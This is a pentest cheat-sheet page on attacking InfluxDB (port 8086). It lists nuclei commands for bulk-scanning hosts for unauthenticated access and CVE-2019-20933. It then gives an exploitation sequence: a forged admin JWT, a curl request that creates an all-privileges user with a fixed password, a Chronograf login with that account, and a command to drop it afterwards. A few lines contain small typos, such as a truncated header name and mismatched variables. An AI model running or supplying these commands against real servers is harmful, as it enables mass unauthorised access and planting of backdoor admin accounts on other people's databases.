# 8086 - InfluxDB

## Potential Risks

### Unauthorized Access

```bash
# https://github.com/yuukisec/iPoCs
# RHOST=remoteHost; RPORT=8086
nuclei -t ~/ipocs -id influxdb-unauth -u $RHOST:$PORT

# Bulk testing
# RHOST_LIST=hosts.txt
nuclei -t ~/ipocs -id influxdb-unauth -l $RHOST_LIST -c 100 -bs 100 -prc 100
```

### CVE-2019-20933 (Unauthorized Access)

```bash
# https://github.com/yuukisec/iPoCs
# RHOST=remoteHost; RPORT=8086
nuclei -t ~/ipocs -id influxdb-cve-2019-20933-unauth -u $RHOST:$RPORT

# Bulk testing
# RHOST_LIST=hosts.txt
nuclei -t ~/ipocs -id influxdb-cve-2019-20933-unauth -l $RHOST_LIST -c 100 -bs 100 -500
```

## **Exploitation**

### Information Disclosure

```bash
# Step 1: Create user
# RHOST=remoteHost; RPORT=8086
# AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNTM0MDIxODU2MDB9.Fu66RZDcUSawPpmtCpVDMr8kWjbTgmBa4I1kFzCLxM8"
# CONTENT_TYPE="tent-Type: application/x-www-form-urlencoded"
# BODY=q="CREATE USER \"santa\" with PASSWORD '1qaz@WSX3edc' WITH ALL PRIVILEGES;"
curl -X POST -H $AUTH -H $CONTENT_TYPE -d $BODY http://$RHOST:$RPORT/query
curl -X POST -H $AUTH -H $CONTENT_TYPE -d $BODY https://$RHOST:$RPORT/query

# Step 2: Use the tools to browse
# https://github.com/influxdata/chronograf
chronograf --influxdb-url="$URL" \
    --influxdb-username="santa" \
    --influxdb-password="1qaz@WSX3edc"

# Others
BODY=q="DROP USER \"santa\";"
curl -X POST -H $AUTH -d $BODY $URL/query
```
